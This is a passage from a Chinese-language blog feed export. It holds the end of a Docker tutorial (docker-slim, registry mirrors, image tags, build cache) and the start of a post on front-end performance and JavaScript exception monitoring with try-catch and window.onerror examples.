data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612172998730-15df8c10-776b-4d2c-a847-255fc4451102.png#height=49&id=ypKU3&originHeight=49&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12899&status=done&style=none&title=&width=735" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />将 docekr-slim 和 docker-slim-sensor 移动到&#x2F;usr&#x2F;local&#x2F;bin 文件夹下，这样可以在全局使用 docker-slim 命令，命令行输入 <code>docker-slim -v</code> ，显示版本信息表明安装成功<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612173355856-2789cc0a-f9d6-4801-8312-f5f4bb21f1e1.png#height=29&id=EdPhu&originHeight=29&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6242&status=done&style=none&title=&width=660" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612173355856-2789cc0a-f9d6-4801-8312-f5f4bb21f1e1.png#height=29&id=EdPhu&originHeight=29&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6242&status=done&style=none&title=&width=660" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="ChgV2"></a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在使用 docker-slim 对镜像进行压缩前需要提前打包一次，docker build -t test . <br />拿到打包生成的 image ID，使用 docker-slim build –target [image ID]，即自动生成[image Name].slim 格式的镜像，如下：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612174796912-5c448835-3cdf-4edf-9e69-eb8704a10759.png#height=176&id=ik59S&originHeight=176&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31121&status=done&style=none&title=&width=1748" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612174796912-5c448835-3cdf-4edf-9e69-eb8704a10759.png#height=176&id=ik59S&originHeight=176&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31121&status=done&style=none&title=&width=1748" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="FmcFF"></a></p><h2 id="需要注意的坑"><a href="#需要注意的坑" class="headerlink" title="需要注意的坑"></a>需要注意的坑</h2><p>如果预期需要使用 docker-slim 进行压缩，那么不要使用 npm scripts 这样的命令，在当前版本里 npm scripts 是无法被依赖分析读取的，也就是说会干掉全局状态下的 node_modules，导致应用无法被启动</p><p>例如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误案例</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;npm&quot;</span>, <span class="string">&quot;start&quot;</span>]  -&gt; npm start 等于<span class="string">&quot;start&quot;</span>: <span class="string">&quot;pm2-runtime app.js --watch&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确案例</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;./app.js&quot;</span>, <span class="string">&quot;--watch&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>具体的 issue： <a href="https://github.com/docker-slim/docker-slim/issues/150">https://github.com/docker-slim/docker-slim/issues/150</a><br><a name="03NYR"></a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><a name="PbfYJ"></a></p><h1 id="配置-github-CI-x2F-CD"><a href="#配置-github-CI-x2F-CD" class="headerlink" title="配置 github CI&#x2F;CD"></a>配置 github CI&#x2F;CD</h1><p>官方文档： <a href="https://docs.docker.com/ci-cd/github-actions/">https://docs.docker.com/ci-cd/github-actions/</a></p><p><a name="uUmD5"></a></p><h1 id="更换-docker-源-–国内-cdn"><a href="#更换-docker-源-–国内-cdn" class="headerlink" title="更换 docker 源 –国内 cdn"></a>更换 docker 源 –国内 cdn</h1><p>毕竟国外的资源部分情况下还是比较慢（慢的过分..），同理 npm 一般要换成淘宝源或者使用 cnpm，这里的话我用的是阿里云的源</p><p><a name="okH7n"></a></p><h2 id="查看当前状态"><a href="#查看当前状态" class="headerlink" title="查看当前状态"></a>查看当前状态</h2><p>输入 <code>docker info</code> 查看当前 docker 基础信息，行数比较多，可以直接 <code>command + F</code> 搜索 ”Registry”，一般情况下会显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方镜像源</span></span><br><span class="line">Registry: https://index.docker.io/v1/</span><br></pre></td></tr></table></figure><p><a name="HVEpl"></a></p><h2 id="阿里云镜像源"><a href="#阿里云镜像源" class="headerlink" title="阿里云镜像源"></a>阿里云镜像源</h2><p>登录阿里云账号：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a>，找到容器镜像服务 -&gt; 镜像工具 -&gt; 镜像加速器，<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612182190580-baeec99e-52ad-485e-8e48-c967e49c4b3a.png#height=359&id=Nco5x&originHeight=359&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28848&status=done&style=none&title=&width=509" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612182190580-baeec99e-52ad-485e-8e48-c967e49c4b3a.png#height=359&id=Nco5x&originHeight=359&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28848&status=done&style=none&title=&width=509" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612182857294-743dfc53-7eb3-46b8-9104-81c81db5cc6c.png#height=918&id=YmKxm&originHeight=918&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104263&status=done&style=none&title=&width=878" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612182857294-743dfc53-7eb3-46b8-9104-81c81db5cc6c.png#height=918&id=YmKxm&originHeight=918&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104263&status=done&style=none&title=&width=878" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="VLk8r"></a></p><h2 id="设置-Preferences"><a href="#设置-Preferences" class="headerlink" title="设置 Preferences"></a>设置 Preferences</h2><p>如果是最新的 docker desktop 可以略过前面的文字，直接找到这段，按流程操作，找到 preferences，添加到 json 中，重启 docker 服务即可<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612182951498-68b082aa-3e73-424d-b2fe-6ce632286864.png#height=792&id=bhhlX&originHeight=792&originWidth=2080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117634&status=done&style=none&title=&width=2080" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612182951498-68b082aa-3e73-424d-b2fe-6ce632286864.png#height=792&id=bhhlX&originHeight=792&originWidth=2080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117634&status=done&style=none&title=&width=2080" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />发现多了一行<code>Registry Mirrors</code>即添加成功，此时可以重新<code>docker pull [images]</code>体验一下新的速度~<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612183398620-5885dd9b-705d-4913-abfc-08fd1cfba1a1.png#height=133&id=gxwpL&originHeight=133&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10126&status=done&style=none&title=&width=327" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612183398620-5885dd9b-705d-4913-abfc-08fd1cfba1a1.png#height=133&id=gxwpL&originHeight=133&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10126&status=done&style=none&title=&width=327" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="6KBm1"></a></p><h1 id="杂项知识"><a href="#杂项知识" class="headerlink" title="杂项知识"></a>杂项知识</h1><p><a name="3hhwH"></a></p><h2 id="读懂-docker-tag"><a href="#读懂-docker-tag" class="headerlink" title="读懂 docker tag"></a>读懂 docker tag</h2><p>一般镜像名的 tag 都会带一些后缀，以 node 为例，如下图： <br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612153220352-3636745e-4f35-486c-b597-be358c7b0ce2.png#height=664&id=Amb2v&originHeight=664&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115197&status=done&style=none&title=&width=1225" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612153220352-3636745e-4f35-486c-b597-be358c7b0ce2.png#height=664&id=Amb2v&originHeight=664&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115197&status=done&style=none&title=&width=1225" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>可以看到 tag 名多的眼花缭乱，第一次看大概率会懵逼，这里就大概解释下，其实所有的这些标签名都是对应基础镜像版本，如下：</p><p>linux 发行版： alpine， debian<br />debian 版本下 linux 代差：</p><ul><li>buster Debian10 （目前 node 默认）</li><li>stretch Debian9</li><li>jessie Debian8</li><li>wheezy Debian7</li></ul><p>slim 为修饰词，如 buster-slim，为 buster 版本下的删减版</p><p>这一下来看的话就比较清晰了，alpine 和 debian 对比来看的话，alpine 为 linux 的最小发行版本，貌似只有 5M，debian 是完整版本<br />当然这里还有个坑，docker 的官方镜像一般都是用 debian 作为镜像的，在网上查了下资料，除了包大小区别外，执行机制也有区别，具体没研究过，如<strong>果用在生产环境的话还是优先考虑 debian</strong>吧<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612154129532-cc5c3f56-df9b-447a-a322-6e26a54f1de6.png#height=88&id=WNglP&originHeight=88&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20558&status=done&style=none&title=&width=740" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612154129532-cc5c3f56-df9b-447a-a322-6e26a54f1de6.png#height=88&id=WNglP&originHeight=88&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20558&status=done&style=none&title=&width=740" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612154117039-3ba67c21-7ec8-485f-a622-443efb30470b.png#height=198&id=AEonF&originHeight=198&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45016&status=done&style=none&title=&width=763" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612154117039-3ba67c21-7ec8-485f-a622-443efb30470b.png#height=198&id=AEonF&originHeight=198&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45016&status=done&style=none&title=&width=763" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />关于 debian 版本代差的问题这个如果没有历史包袱的话默认 buster 就可以了，node 的 latest 就是用的这个版本，其实可以选择 slim 版本，从官网上给出的代码包大小来看相差了 6 倍，对于内存占用敏感的话可以使用<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612155108323-95c7b955-b383-4ae0-8f53-25972ee74d70.png#height=501&id=bToQ2&originHeight=501&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61313&status=done&style=none&title=&width=1243" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612155108323-95c7b955-b383-4ae0-8f53-25972ee74d70.png#height=501&id=bToQ2&originHeight=501&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61313&status=done&style=none&title=&width=1243" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>具体怎么自己做 slim <a href="#5kNcS">点击这里</a></p><p><a name="ATVC9"></a></p><h2 id="dockerfile-缓存机制"><a href="#dockerfile-缓存机制" class="headerlink" title="dockerfile 缓存机制"></a>dockerfile 缓存机制</h2><p>构建映像时，Docker 将逐步<code>Dockerfile</code>执行您的指令，  并按指定的顺序执行每个指令。在检查每条指令时，Docker 会在其缓存中查找可重用的现有映像，而不是创建新的（重复的）映像。<br />如果根本不想使用缓存，则可以使用命令<code>--no-cache=true</code> 上的选项<code>docker build</code>。但是，如果您确实让 Docker 使用其缓存，那么了解何时可以找到匹配的映像，这一点很重要。Docker 遵循的基本规则概述如下：</p><ul><li>从已在缓存中的父映像开始，将下一条指令与从该基本映像派生的所有子映像进行比较，以查看是否其中一个是使用完全相同的指令构建的。如果不是，则高速缓存无效。</li><li>在大多数情况下，只需将中的指令<code>Dockerfile</code>与子图像之一进行比较就足够了。但是，某些说明需要更多的检查和解释。</li><li>对于<code>ADD</code>和<code>COPY</code>指令，将检查图像中文件的内容，并为每个文件计算一个校验和。在这些校验和中不考虑文件的最后修改时间和最后访问时间。在缓存查找期间，将校验和与现有映像中的校验和进行比较。如果文件中的任何内容（例如内容和元数据）发生了更改，则缓存将无效。</li><li>除了<code>ADD</code>和<code>COPY</code>命令之外，缓存检查不会查看容器中的文件来确定缓存是否匹配。例如，在处理<code>RUN apt-get -y update</code>命令时，不检查容器中更新的文件以确定是否存在缓存命中。在这种情况下，仅使用命令字符串本身来查找匹配项。</li></ul><p>缓存无效后，所有后续<code>Dockerfile</code>命令都会生成新映像，并且不使用缓存</p><p>原文地址：<a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">https://docs.docker.com/develop/develop-images/dockerfile_best-practices&#x2F;</a></p><p><a name="jhWzS"></a></p><h2 id="关于更多命令"><a href="#关于更多命令" class="headerlink" title="关于更多命令"></a>关于更多命令</h2><p><a name="9wGlq"></a></p><h3 id="docker-cli-更多命令"><a href="#docker-cli-更多命令" class="headerlink" title="docker cli 更多命令"></a>docker cli 更多命令</h3><p>官方文档： <a href="https://docs.docker.com/engine/reference/run/">https://docs.docker.com/engine/reference/run/</a><br><a name="CTDUU"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><a name="ZAOaR"></a></p><h3 id="docker-compose-cli-更多命令"><a href="#docker-compose-cli-更多命令" class="headerlink" title="docker-compose cli 更多命令"></a>docker-compose cli 更多命令</h3><p>官方文档：<a href="https://docs.docker.com/compose/reference/overview/">https://docs.docker.com/compose/reference/overview/</a></p><p><a name="jvVaM"></a></p><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ul><li>docekr desktop: <a href="https://docs.docker.com/docker-for-mac/install/">https://docs.docker.com/docker-for-mac/install/</a></li><li>docker 新人文档： <a href="https://docs.docker.com/get-started/">https://docs.docker.com/get-started/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>性能监控、异常监控</title>
      <link href="/2023/06/28/frontend/monitor/xing-neng-jian-kong-yi-chang-jian-kong/"/>
      <url>/2023/06/28/frontend/monitor/xing-neng-jian-kong-yi-chang-jian-kong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="gLJtG"></a></p><h2 id="性能监控"><a href="#性能监控" class="headerlink" title="性能监控"></a>性能监控</h2><p><a name="2F9Wx"></a></p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>一个是 http 的方面，在后端 log 日志，流入 kafka，然后在 kafka 消费数据，可以准确的监控到哪些接口有异常？异常率是多少？</p><p><a name="LOVmn"></a></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>前端的 Performance 的 api，在用户的实时使用的过程中，就会产生数据，这样就能实现页面性能监控。</p><p><a name="DcmBc"></a></p><h2 id="异常监控"><a href="#异常监控" class="headerlink" title="异常监控"></a>异常监控</h2><blockquote><p>异常是不可控的，会影响最终的呈现结果，但是我们有充分的理由去做这样的事情。</p></blockquote><br /><a name="6r0ZD"></a>### 什么是异常html、css这些东西，无非就是一个展示的问题，还不至于让页面白屏的事情发生，所谓的异常监控，其实就是js的异常监控。在前端领域，window.onerror是进行js异常的监听事件。并且要知道，它在IE中，是不支持的，所以IE的监控，要使用try catch 的方式进行捕获，比如我们可能还要注意到，遇到异步的时候，这个如何做try catch的异常捕获。<p><a name="dJ0lQ"></a></p><h3 id="为什么要处理异常"><a href="#为什么要处理异常" class="headerlink" title="为什么要处理异常"></a>为什么要处理异常</h3><ul><li>增强用户体验；</li><li>远程定位问题；</li><li>未雨绸缪，及早发现问题；</li><li>无法复线问题，尤其是移动端，机型，系统都是问题；</li><li>完善的前端方案，前端监控系统。</li></ul><p>对于 <code>JS</code> 而言，我们面对的仅仅只是异常，异常的出现不会直接导致 <code>JS</code> 引擎崩溃，最多只会使当前执行的任务终止。</p><p><a name="0T9Ws"></a></p><h3 id="需要处理哪些异常"><a href="#需要处理哪些异常" class="headerlink" title="需要处理哪些异常"></a>需要处理哪些异常</h3><ul><li><code>JS</code> 语法错误、代码异常</li><li><code>AJAX</code> 请求异常</li><li>静态资源加载异常</li><li><code>Promise</code> 异常</li><li><code>Iframe</code> 异常</li><li>跨域 Script error</li><li>崩溃和卡顿</li></ul><p><a name="i1meQ"></a></p><h4 id="Try-Catch"><a href="#Try-Catch" class="headerlink" title="Try-Catch"></a>Try-Catch</h4><p><code>try-catch</code>  只能捕获到同步的运行时错误，对语法和异步错误却无能为力，捕获不到。<br /><strong>1.同步运行时错误：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> name = <span class="string">&quot;jartto&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(nam);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">捕获到异常： <span class="title class_">ReferenceError</span>: nam is not defined</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">3</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>2.不能捕获到语法错误，我们修改一下代码，删掉一个单引号：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> name = <span class="string">&#x27;jartto;</span></span><br><span class="line"><span class="string">  console.log(nam);</span></span><br><span class="line"><span class="string">&#125; catch(e) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  console.log(&#x27;</span>捕获到异常：<span class="string">&#x27;,e);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>输出：<br /><code>Uncaught SyntaxError: Invalid or unexpected token</code></p><blockquote><p>不过语法错误在我们开发阶段就可以看到，应该不会顺利上到线上环境。</p></blockquote><p><strong>3.异步错误</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="literal">undefined</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">v</span>) =&gt;</span> v);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看看日志：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">VM308</span>:<span class="number">3</span> <span class="title class_">Uncaught</span> <span class="title class_">TypeError</span>: <span class="title class_">Cannot</span> read property <span class="string">&#x27;map&#x27;</span> <span class="keyword">of</span> <span class="literal">undefined</span></span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">3</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p>并没有捕获到异常，这是需要我们特别注意的地方。</p><p><a name="Xldy7"></a></p><h4 id="window-onerror-不是万能的"><a href="#window-onerror-不是万能的" class="headerlink" title="window.onerror 不是万能的"></a>window.onerror 不是万能的</h4><p>当  <code>JS</code>  运行时错误发生时，<code>window</code>  会触发一个  <code>ErrorEvent</code>  接口的  <code>error</code>  事件，并执行  <code>window.onerror()</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125;  message    错误信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125;  source    出错文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Number</span>&#125;  lineno    行号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Number</span>&#125;  colno    列号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125;  error  Error对象（对象）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>1.首先试试同步运行时错误</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="comment">// message：错误信息（字符串）。</span></span><br><span class="line">  <span class="comment">// source：发生错误的脚本URL（字符串）</span></span><br><span class="line">  <span class="comment">// lineno：发生错误的行号（数字）</span></span><br><span class="line">  <span class="comment">// colno：发生错误的列号（数字）</span></span><br><span class="line">  <span class="comment">// error：Error对象（对象）</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Jartto</span>;</span><br></pre></td></tr></table></figure><p>可以看到，我们捕获到了异常：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1593768804961-b9bc73ec-acca-474c-b56c-801043199d8e.png#height=294&id=J2JF7&originHeight=294&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58606&status=done&style=none&title=&width=884" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1593768804961-b9bc73ec-acca-474c-b56c-801043199d8e.png#height=294&id=J2JF7&originHeight=294&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58606&status=done&style=none&title=&width=884" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><strong>2.再试试语法错误呢？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;捕获到异常：&#x27;</span>,&#123;message, source, lineno, colno, error&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;Jartto</span></span><br></pre></td></tr></table></figure><p>控制台打印出了这样的异常：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">SyntaxError</span>: <span class="title class_">Invalid</span> or unexpected token</span><br></pre></td></tr></table></figure><blockquote><p>什么，竟然没有捕获到语法错误？</p></blockquote><p><strong>3.怀着忐忑的心，我们最后来试试异步运行时错误：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Jartto</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>控制台输出了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">捕获到异常： &#123;<span class="attr">message</span>: <span class="string">&quot;Uncaught ReferenceError: Jartto is not defined&quot;</span>, <span class="attr">source</span>: <span class="string">&quot;http://127.0.0.1:8001/&quot;</span>, <span class="attr">lineno</span>: <span class="number">36</span>, <span class="attr">colno</span>: <span class="number">5</span>, <span class="attr">error</span>: <span class="title class_">ReferenceError</span>: <span class="title class_">Jartto</span> is not defined</span><br><span class="line">    at <span class="built_in">setTimeout</span> (<span class="attr">http</span>:<span class="comment">//127.0.0.1:8001/:36:5)&#125;</span></span><br></pre></td></tr></table></figure><p><strong>4.接着，我们试试网络请求异常的情况：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;捕获到异常：&#x27;</span>,&#123;message, source, lineno, colno, error&#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./jartto.png&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>我们发现，不论是静态资源异常，或者接口异常，错误都无法捕获到。</p></blockquote><p>补充一点：<code>window.onerror</code>  函数只有在返回  <code>true</code>  的时候，异常才不会向上抛出，否则即使是知道异常的发生控制台还是会显示  <code>Uncaught Error: xxxxx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span 